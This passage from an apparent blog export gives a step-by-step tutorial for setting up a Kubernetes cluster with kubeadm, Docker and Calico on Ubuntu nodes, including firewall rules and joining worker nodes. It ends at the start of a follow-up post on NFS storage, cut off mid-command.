Range</th>\n<th>Purpose</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>TCP</td>\n<td>Inbound</td>\n<td>10250</td>\n<td>Kubelet API</td>\n</tr>\n<tr>\n<td>TCP</td>\n<td>Inbound</td>\n<td>30000-32767</td>\n<td>NodePort Services</td>\n</tr>\n</tbody>\n</table>\n<p>You can either disable the firewall or allow the ports on each node.</p>\n<h4 id=\"method-1-add-firewall-rules-to-allow-the-ports-used-by-the-kubernetes-nodes\"><a class=\"markdownIt-Anchor\" href=\"#method-1-add-firewall-rules-to-allow-the-ports-used-by-the-kubernetes-nodes\">#</a> Method 1: Add firewall rules to allow the ports used by the Kubernetes nodes</h4>\n<p>Allow the ports used by the master node:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 6443/tcp</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 2379:2380/tcp</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 10250/tcp</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 10259/tcp</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw allow 10257/tcp</span><br></pre></td></tr></table></figure>\n<p>Allow the ports used by the worker nodes:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-worker1:~$ sudo ufw allow 10250/tcp</span><br><span class=\"line\">4n6nk8s@4n6nk8s-worker1:~$ sudo ufw allow 30000:32767/tcp</span><br></pre></td></tr></table></figure>\n<h4 id=\"method-2-disable-the-firewall\"><a class=\"markdownIt-Anchor\" href=\"#method-2-disable-the-firewall\">#</a> Method 2: Disable the firewall</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt command</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw status</span><br><span class=\"line\">Status: active</span><br><span class=\"line\"></span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw <span class=\"built_in\">disable</span></span><br><span class=\"line\">Firewall stopped and disabled on system startup</span><br><span class=\"line\"></span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw status</span><br><span class=\"line\">Status: inactive</span><br></pre></td></tr></table></figure>\n<h3 id=\"installing-docker-engine\"><a class=\"markdownIt-Anchor\" href=\"#installing-docker-engine\">#</a> Installing Docker Engine</h3>\n<p>Kubernetes requires you to install a container runtime to work correctly.There are many available options like containerd, CRI-O, Docker etc</p>\n<p>By default, Kubernetes uses the Container Runtime Interface (CRI) to interface with your chosen container runtime.If you don’t specify a runtime, kubeadm automatically tries to detect an installed container runtime by scanning through a list of known endpoints.</p>\n<p>You must install the Docker Engine on each node!</p>\n<h4 id=\"1-set-up-the-repository\"><a class=\"markdownIt-Anchor\" href=\"#1-set-up-the-repository\">#</a> 1- Set up the repository</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo apt update</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo apt install ca-certificates curl gnupg lsb-release</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-add-dockers-official-gpg-key\"><a class=\"markdownIt-Anchor\" href=\"#2-add-dockers-official-gpg-key\">#</a> 2- Add Docker’s official GPG key</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo <span class=\"built_in\">mkdir</span> -p /etc/apt/keyrings</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg</span><br></pre></td></tr></table></figure>\n<h4 id=\"3-add-the-stable-repository-using-the-following-command\"><a class=\"markdownIt-Anchor\" href=\"#3-add-the-stable-repository-using-the-following-command\">#</a> 3- Add the stable repository using the following command:</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ <span class=\"built_in\">echo</span> \\</span><br><span class=\"line\">  <span class=\"string\">&quot;deb [arch=<span class=\"subst\">$(dpkg --print-architecture)</span> signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \\</span></span><br><span class=\"line\"><span class=\"string\">  <span class=\"subst\">$(lsb_release -cs)</span> stable&quot;</span> | sudo <span class=\"built_in\">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br></pre></td></tr></table></figure>\n<h4 id=\"4-install-the-docker-container\"><a class=\"markdownIt-Anchor\" href=\"#4-install-the-docker-container\">#</a> 4- Install the docker container</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo apt update &amp;&amp; sudo apt install docker-ce docker-ce-cli containerd.io -y</span><br></pre></td></tr></table></figure>\n<h4 id=\"5-make-sure-that-the-docker-will-work-on-system-startup\"><a class=\"markdownIt-Anchor\" href=\"#5-make-sure-that-the-docker-will-work-on-system-startup\">#</a> 5- Make sure that the docker will work on system startup</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo systemctl <span class=\"built_in\">enable</span> --now docker </span><br></pre></td></tr></table></figure>\n<h4 id=\"6-configuring-cgroup-driver\"><a class=\"markdownIt-Anchor\" href=\"#6-configuring-cgroup-driver\">#</a> 6- Configuring Cgroup Driver:</h4>\n<p>The Cgroup Driver must be configured to let the kubelet process work correctly</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ <span class=\"built_in\">cat</span> &lt;&lt;<span class=\"string\">EOF | sudo tee /etc/docker/daemon.json</span></span><br><span class=\"line\"><span class=\"string\">&#123;</span></span><br><span class=\"line\"><span class=\"string\">  &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;],</span></span><br><span class=\"line\"><span class=\"string\">  &quot;log-driver&quot;: &quot;json-file&quot;,</span></span><br><span class=\"line\"><span class=\"string\">  &quot;log-opts&quot;: &#123;</span></span><br><span class=\"line\"><span class=\"string\">    &quot;max-size&quot;: &quot;100m&quot;</span></span><br><span class=\"line\"><span class=\"string\">  &#125;,</span></span><br><span class=\"line\"><span class=\"string\">  &quot;storage-driver&quot;: &quot;overlay2&quot;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"7-restart-the-docker-service-to-make-sure-the-new-configuration-is-applied\"><a class=\"markdownIt-Anchor\" href=\"#7-restart-the-docker-service-to-make-sure-the-new-configuration-is-applied\">#</a> 7- Restart the docker service to make sure the new configuration is applied</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo systemctl daemon-reload &amp;&amp; sudo systemctl restart docker</span><br></pre></td></tr></table></figure>\n<h3 id=\"installing-kubernetes-kubeadm-kubelet-and-kubectl\"><a class=\"markdownIt-Anchor\" href=\"#installing-kubernetes-kubeadm-kubelet-and-kubectl\">#</a> Installing kubernetes (kubeadm, kubelet, and kubectl):</h3>\n<p>Install the following dependency required by Kubernetes on each node</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo apt install apt-transport-https</span><br></pre></td></tr></table></figure>\n<h4 id=\"download-the-google-cloud-public-signing-key\"><a class=\"markdownIt-Anchor\" href=\"#download-the-google-cloud-public-signing-key\">#</a> Download the Google Cloud public signing key:</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo curl -fsSLo /usr/share/keyrings/kubernetes-archive-keyring.gpg https://packages.cloud.google.com/apt/doc/apt-key.gpg</span><br></pre></td></tr></table></figure>\n<h4 id=\"add-the-kubernetes-apt-repository\"><a class=\"markdownIt-Anchor\" href=\"#add-the-kubernetes-apt-repository\">#</a> Add the Kubernetes apt repository:</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ <span class=\"built_in\">echo</span> <span class=\"string\">&quot;deb [signed-by=/usr/share/keyrings/kubernetes-archive-keyring.gpg] https://apt.kubernetes.io/ kubernetes-xenial main&quot;</span> | sudo <span class=\"built_in\">tee</span> /etc/apt/sources.list.d/kubernetes.list</span><br></pre></td></tr></table></figure>\n<h4 id=\"update-the-apt-package-index-and-install-kubeadm-kubelet-and-kubeclt\"><a class=\"markdownIt-Anchor\" href=\"#update-the-apt-package-index-and-install-kubeadm-kubelet-and-kubeclt\">#</a> Update the apt package index and install kubeadm, kubelet, and kubeclt</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo apt update &amp;&amp; sudo apt install -y kubelet=1.23.1-00 kubectl=1.23.1-00 kubeadm=1.23.1-00</span><br></pre></td></tr></table></figure>\n<h2 id=\"initializing-the-control-plane-node\"><a class=\"markdownIt-Anchor\" href=\"#initializing-the-control-plane-node\">#</a> Initializing the control-plane node</h2>\n<p>At this point, we have 3 nodes with docker,  <code>kubeadm</code> ,  <code>kubelet</code> , and  <code>kubectl</code>  installed. Now we must initialize the Kubernetes master, which will manage the whole cluster and the pods running within the cluster  <code>kubeadm init</code>  by specifiy the address of the master node and the ipv4 address pool of the pods</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo kubeadm init --apiserver-advertise-address=192.168.1.18 --pod-network-cidr=10.1.0.0/16</span><br></pre></td></tr></table></figure>\n<p>You should wait a few minutes until the initialization is completed. The first initialization will take a lot of time if your connexion speed is slow (pull the images of the cluster components)</p>\n<h3 id=\"configuring-kubectl\"><a class=\"markdownIt-Anchor\" href=\"#configuring-kubectl\">#</a> Configuring kubectl</h3>\n<p>As known, the  <code>kubectl</code>  is a command line tool for performing actions on your cluster. So we must to configure  <code>kubectl</code> . Run the following command from your master node:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ <span class=\"built_in\">mkdir</span> -p <span class=\"variable\">$HOME</span>/.kube</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo <span class=\"built_in\">cp</span> -i /etc/kubernetes/admin.conf <span class=\"variable\">$HOME</span>/.kube/config</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo <span class=\"built_in\">chown</span> $(<span class=\"built_in\">id</span> -u):$(<span class=\"built_in\">id</span> -g) <span class=\"variable\">$HOME</span>/.kube/config</span><br></pre></td></tr></table></figure>\n<h3 id=\"installing-calico-cni\"><a class=\"markdownIt-Anchor\" href=\"#installing-calico-cni\">#</a> Installing Calico CNI</h3>\n<p>Calico provides network and network security solutions for containers. Calico is best known for its performance, flexibility and power. Use-cases: Calico can be used within a lot of Kubernetes platforms (kops, Kubespray, docker enterprise, etc.) to block or allow traffic between pods, namespaces</p>\n<h4 id=\"1-install-tigera-calico-operator\"><a class=\"markdownIt-Anchor\" href=\"#1-install-tigera-calico-operator\">#</a> 1- Install Tigera Calico operator</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl create -f <span class=\"string\">&quot;https://projectcalico.docs.tigera.io/manifests/tigera-operator.yaml&quot;</span></span><br></pre></td></tr></table></figure>\n<p>The Tigera Operator is a Kubernetes operator which manages the lifecycle of a Calico or Calico Enterprise installation on Kubernetes. Its goal is to make installation, upgrades, and ongoing lifecycle management of Calico and Calico Enterprise as simple and reliable as possible.</p>\n<h4 id=\"2-download-the-custom-resourcesyaml-manifest-and-change-it\"><a class=\"markdownIt-Anchor\" href=\"#2-download-the-custom-resourcesyaml-manifest-and-change-it\">#</a> 2- Download the custom-resources.yaml manifest and change it</h4>\n<p>The Calico has a default pod’s CIDR value. But in our example, we set the   <code>--pod-netwokr-cidr=10.1.0.0/16</code> . So we must change the value of pod network CIDR in  <code>custom-resources.yaml</code></p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ wget  <span class=\"string\">&quot;https://projectcalico.docs.tigera.io/manifests/custom-resources.yaml&quot;</span></span><br></pre></td></tr></table></figure>\n<p>Now we edit this file before create the Calico pods</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># This section includes base Calico installation configuration.</span></span><br><span class=\"line\"><span class=\"comment\"># For more information, see: https://projectcalico.docs.tigera.io/v3.23/reference/installation/api#operator.tigera.io/v1.Installation</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">operator.tigera.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Installation</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">default</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"comment\"># Configures Calico networking.</span></span><br><span class=\"line\">  <span class=\"attr\">calicoNetwork:</span></span><br><span class=\"line\">    <span class=\"comment\"># <span class=\"doctag\">Note:</span> The ipPools section cannot be modified post-install.</span></span><br><span class=\"line\">    <span class=\"attr\">ipPools:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">blockSize:</span> <span class=\"number\">26</span></span><br><span class=\"line\">      <span class=\"attr\">cidr:</span> <span class=\"number\">10.1</span><span class=\"number\">.0</span><span class=\"number\">.0</span><span class=\"string\">/16</span> <span class=\"comment\">#change this value with yours</span></span><br><span class=\"line\">      <span class=\"attr\">encapsulation:</span> <span class=\"string\">VXLANCrossSubnet</span></span><br><span class=\"line\">      <span class=\"attr\">natOutgoing:</span> <span class=\"string\">Enabled</span></span><br><span class=\"line\">      <span class=\"attr\">nodeSelector:</span> <span class=\"string\">all()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"comment\"># This section configures the Calico API server.</span></span><br><span class=\"line\"><span class=\"comment\"># For more information, see: https://projectcalico.docs.tigera.io/v3.23/reference/installation/api#operator.tigera.io/v1.APIServer</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">operator.tigera.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">APIServer</span> </span><br><span class=\"line\"><span class=\"attr\">metadata:</span> </span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">default</span> </span><br><span class=\"line\"><span class=\"attr\">spec:</span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n<p>After Editing the  <code>custom-resources.yaml</code>  file. Run the following command:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl create -f <span class=\"string\">&quot;custom-resources.yaml&quot;</span> </span><br></pre></td></tr></table></figure>\n<p>Before you can use the cluster, you must wait for the pods required by Calico to be downloaded. You must wait until you find all the pods running and ready!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl get pods --all-namespaces</span><br><span class=\"line\">NAMESPACE          NAME                                       READY   STATUS    RESTARTS       AGE</span><br><span class=\"line\">calico-apiserver   calico-apiserver-5989576d6d-5nw7n          1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">calico-apiserver   calico-apiserver-5989576d6d-h677h          1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">calico-system      calico-kube-controllers-69cfd64db4-9hnh5   1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">calico-system      calico-node-lshdl                          1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">calico-system      calico-typha-76dd7c96d7-88826              1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">kube-system        coredns-64897985d-jkpwh                    1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">kube-system        coredns-64897985d-zk9wx                    1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">kube-system        etcd-master                                1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">kube-system        kube-apiserver-master                      1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">kube-system        kube-controller-manager-master             1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">kube-system        kube-proxy-4nf4q                           1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">kube-system        kube-scheduler-master                      1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">tigera-operator    tigera-operator-7d8c9d4f67-j5b2g           1/1     Running   2 (103s ago)    4min</span><br></pre></td></tr></table></figure>\n<h2 id=\"join-the-worker-nodes\"><a class=\"markdownIt-Anchor\" href=\"#join-the-worker-nodes\">#</a> Join the worker nodes</h2>\n<p>Now our cluster is ready to work! let’s join the worker nodes to this cluster by getting the token from the master node</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo kubeadm token create --print-join-command</span><br><span class=\"line\">kubeadm <span class=\"built_in\">join</span> 192.168.1.18:6443 --token g4mgtb.e8zgs1c0kpkaj9wt --discovery-token-ca-cert-hash sha256:047628de2a0a43127b7c4774093203631d315451874efc6b63421a4da9bee2ec</span><br></pre></td></tr></table></figure>\n<p>Now let’s move to the worker node and run the following command given by  <code>kubeadm token create</code></p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-worker1:~$ sudo kubeadm <span class=\"built_in\">join</span> 192.168.1.18:6443 --token g4mgtb.e8zgs1c0kpkaj9wt </span><br><span class=\"line\">\\--discovery-token-ca-cert-hash sha256:047628de2a0a43127b7c4774093203631d315451874efc6b63421a4da9bee2ec</span><br></pre></td></tr></table></figure>\n<p>The output must be similar to the following</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[preflight] Running pre-flight checks</span><br><span class=\"line\">[preflight] Reading configuration from the cluster...</span><br><span class=\"line\">[preflight] FYI: You can look at this config file with <span class=\"string\">&#x27;kubectl -n kube-system get cm kubeadm-config -o yaml&#x27;</span></span><br><span class=\"line\">W0623 12:45:07.940655   23651 utils.go:69] The recommended value <span class=\"keyword\">for</span> <span class=\"string\">&quot;resolvConf&quot;</span> <span class=\"keyword\">in</span> <span class=\"string\">&quot;KubeletConfiguration&quot;</span> is: /run/systemd/resolve/resolv.conf; the provided value is: /run/systemd/resolve/resolv.conf</span><br><span class=\"line\">[kubelet-start] Writing kubelet configuration to file <span class=\"string\">&quot;/var/lib/kubelet/config.yaml&quot;</span></span><br><span class=\"line\">[kubelet-start] Writing kubelet environment file with flags to file <span class=\"string\">&quot;/var/lib/kubelet/kubeadm-flags.env&quot;</span></span><br><span class=\"line\">[kubelet-start] Starting the kubelet</span><br><span class=\"line\">[kubelet-start] Waiting <span class=\"keyword\">for</span> the kubelet to perform the TLS Bootstrap...</span><br><span class=\"line\"></span><br><span class=\"line\">This node has joined the cluster:</span><br><span class=\"line\">* Certificate signing request was sent to apiserver and a response was received.</span><br><span class=\"line\">* The Kubelet was informed of the new secure connection details.</span><br><span class=\"line\"></span><br><span class=\"line\">Run <span class=\"string\">&#x27;kubectl get nodes&#x27;</span> on the control-plane to see this node <span class=\"built_in\">join</span> the cluster.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>Now let’s Check the cluster by running  <code>kubectl get nodes</code>  command on the master node.</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl get nodes</span><br><span class=\"line\"></span><br><span class=\"line\">NAME              STATUS     ROLES                  AGE    VERSION</span><br><span class=\"line\">4n6nk8s-master    Ready      control-plane,master   40m5s  v1.23.1</span><br><span class=\"line\">4n6nk8s-worker1   Ready      &lt;none&gt;                 3m7s   v1.23.1</span><br><span class=\"line\">4n6nk8s-worker2   Ready      &lt;none&gt;                 2m3s   v1.23.1</span><br></pre></td></tr></table></figure>\n<h2 id=\"references\"><a class=\"markdownIt-Anchor\" href=\"#references\">#</a> References:</h2>\n<div class=\"links\"><div class=\"item\" title=\"Kubernetes Documentation\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3Mvc2V0dXAvcHJvZHVjdGlvbi1lbnZpcm9ubWVudC90b29scy9rdWJlYWRtL2NyZWF0ZS1jbHVzdGVyLWt1YmVhZG0v\" data-background-image=\"https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Kubernetes_logo_without_workmark.svg/1200px-Kubernetes_logo_without_workmark.svg.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3Mvc2V0dXAvcHJvZHVjdGlvbi1lbnZpcm9ubWVudC90b29scy9rdWJlYWRtL2NyZWF0ZS1jbHVzdGVyLWt1YmVhZG0v\">Kubernetes Documentation</span>\n          <p class=\"desc\">Creating a cluster with kubeadm</p>\n          </div></div><div class=\"item\" title=\"Calico Documentation\" style=\"--block-color:#FB7031;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9wcm9qZWN0Y2FsaWNvLmRvY3MudGlnZXJhLmlvL2dldHRpbmctc3RhcnRlZC9rdWJlcm5ldGVzL3NlbGYtbWFuYWdlZC1vbnByZW0vb25wcmVtaXNlcw==\" data-background-image=\"https://projectcalico.docs.tigera.io/images/favicon.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9wcm9qZWN0Y2FsaWNvLmRvY3MudGlnZXJhLmlvL2dldHRpbmctc3RhcnRlZC9rdWJlcm5ldGVzL3NlbGYtbWFuYWdlZC1vbnByZW0vb25wcmVtaXNlcw==\">Calico Documentation</span>\n          <p class=\"desc\">Install Calico Networking for on-premises deployments</p>\n          </div></div><div class=\"item\" title=\"Docker Documentation\" style=\"--block-color:#31bffb;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL2luc3RhbGwvdWJ1bnR1Lw==\" data-background-image=\"https://www.docker.com/wp-content/uploads/2022/05/Docker_Temporary_Image_Google_Blue_1080x1080_v1.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL2luc3RhbGwvdWJ1bnR1Lw==\">Docker Documentation</span>\n          <p class=\"desc\">Install Docker Engine on Ubuntu</p>\n          </div></div></div>\n"},{"title":"NFS as Remote Storage for Kubernetes","date":"2022-09-10T22:26:58.000Z","cover":"https://www.axigen.com/usr/files/articles/x118.png.pagespeed.ic.B1J-BES_Qy.png","_content":"\nWe will setting up a NFS server to use it as remote storage for our cluster to create a lot of persistent volumes in our local infrastructure !\n\nWe Assume that we have 4 Ubuntu 20.04 LTS, The Kubernetes is installed and the `4n6nk8s-nfs` host in the same network with the cluster :\n| Role       | Hostname         | IP address      | \n| ---------- | ---------------- | --------------- |\n| Master     | 4n6nk8s-master   | 192.168.1.18/24 | \n| Worker     | 4n6nk8s-worker1  | 192.168.1.19/24 | \n| Worker     | 4n6nk8s-worker2  | 192.168.1.20/24 | \n| NFS Server | 4n6nk8s-nfs      | 192.168.1.80/24 |\n\n## What is a NFS (Network File System) Server:\nNetwork File System (NFS) is a networking protocol for distributed file sharing. A file system defines the way data in the form of files is stored and retrieved from storage devices, such as hard disk drives, solid-state drives and tape drives. NFS is a network file sharing protocol that defines the way files are stored and retrieved from storage devices across networks.\n\nThis distributed file system protocol allows a user on a client computer to access files over a network in the same way they would access a local storage file.\n## Setting up the NFS server \n\nWe need to install the `nfs-kernel-server` package on the NFS server. This package will store additional packages such as `nfs-common` and `4n6nk8s@rpcbind`\n``` bash Command Line Prompt\n4n6nk8s-nfs:~$ sudo apt install nfs-kernel-server\n```\nNow let's create an NFS Export Directory \n``` bash Command Line 